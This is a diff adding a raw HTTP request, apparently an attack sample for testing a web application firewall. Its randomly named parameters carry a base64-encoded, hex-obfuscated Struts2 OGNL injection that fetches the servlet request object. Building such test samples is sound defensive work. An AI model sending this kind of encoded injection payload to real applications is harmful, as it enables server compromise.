@@ -1,0 +1,13 @@
+POST /ascent/intervention/embrace?colon=inter&homebrew=less%20than&leverage=roll%20out&stage=I3JlcT0jY29udGV4dC5nZXQoJ1x4NjMnKydceDZmJysnXHg2ZCcrJ1x4MmUnKydceDZmJysnXHg3MCcrJ1x4NjUnKydceDZlJysnXHg3MycrJ1x4NzknKydceDZkJysnXHg3MCcrJ1x4NjgnKydceDZmJysnXHg2ZScrJ1x4NzknKydceDJlJysnXHg3OCcrJ1x4NzcnKydceDZmJysnXHg3MicrJ1x4NmInKydceDMyJysnXHgyZScrJ1x4NjQnKydceDY5JysnXHg3MycrJ1x4NzAnKydceDYxJysnXHg3NCcrJ1x4NjMnKydceDY4JysnXHg2NScrJ1x4NzInKydceDJlJysnXHg0OCcrJ1x4NzQnKydceDc0JysnXHg3MCcrJ1x4NTMnKydceDY1JysnXHg3MicrJ1x4NzYnKydceDZjJysnXHg2NScrJ1x4NzQnKydceDUyJysnXHg2NScrJ1x4NzEnKydceDc1JysnXHg2NScrJ1x4NzMnKydceDc0JyAp HTTP/1.1
+Host: waf-ce.chaitin.cn
+Cache-Control: no-cache
+Pragma: no-cache
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Linux; Android 4.4.2; RCT6773W22 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36
+Cookie: consultative=aspect; left%20arrow=manager; SESSIONID=6ea075d1be88be4a995e3aa08a9ed2f25ca15fb3691983c33e0314f6c5f8fc69eecea221c264860db965d5e6ce8c6468
+
